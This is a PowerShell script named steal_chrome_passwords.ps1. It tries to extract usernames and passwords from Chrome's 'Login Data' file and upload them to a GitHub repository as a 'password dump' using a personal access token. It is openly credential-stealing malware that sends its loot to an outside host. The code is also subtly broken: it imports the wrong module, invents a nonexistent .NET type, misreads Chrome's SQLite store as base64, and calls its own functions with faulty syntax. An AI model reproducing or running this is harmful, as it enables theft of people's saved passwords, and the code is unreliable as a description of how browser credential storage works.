# Save this script as steal_chrome_passwords.ps1

# Import required .NET assemblies
Import-Module ActiveDirectory

# Set variables
$gitHubUsername = "your_github_username"
$gitHubRepository = "your_github_repository"
$gitHubPersonalAccessToken = "your_github_personal_access_token"

# Function to save file to disk
function Save-File($content, $filePath) {
    $null = Set-Content -Path $filePath -Value $content
}

# Function to upload file to GitHub
function Upload-File($filePath, $branch) {
    $content = Get-Content -Path $filePath
    $url = "https://api.github.com/repos/$gitHubUsername/$gitHubRepository/contents/$filePath"
    $headers = @{
        "Authorization" = "token $gitHubPersonalAccessToken"
    }
    $payload = @{
        message = "Uploading password dump"
        content = $content
    }
    Invoke-RestMethod -Uri $url -Method Put -Headers $headers -Body $payload -ContentType 'application/json'
}

# Function to find Chrome passwords
function Find-ChromePasswords() {
    $passwords = @()

    try {
        $chromeProfilePath = (Get-Process -Name "chrome").Path.Substring(0, (Get-Process -Name "chrome").Path.LastIndexOf("\")) + "\User Data\Default"

        $secretsJSON = Get-Content -Path "$chromeProfilePath\Login Data" -Encoding Default -Raw
        $secrets = ConvertFrom-SecureString -SecureString ([System.Runtime.InteropServices.Marshal]::PtrToStructure([Convert]::FromBase64String($secretsJSON), [System.Runtime.InteropServices.SafeNativeMethods.SecureDataBlob]))

        foreach ($secret in $secrets.blobs) {
            $username = [System.Text.Encoding]::ASCII.GetString($secret.username)
            $password = [System.Text.Encoding]::ASCII.GetString($secret.password)

            $passwordInfo = New-Object PSObject -Property @{
                Username = $username
                Password = $password
            }

            $passwords += $passwordInfo
        }
    }
    catch {
        Write-Warning "Failed to find Chrome passwords: $_"
    }

    return $passwords
}

# Save passwords to file
$passwords = Find-ChromePasswords
Save-File (ConvertTo-Json $passwords), "passwords.json"

# Upload passwords to GitHub
Upload-File "passwords.json", "master"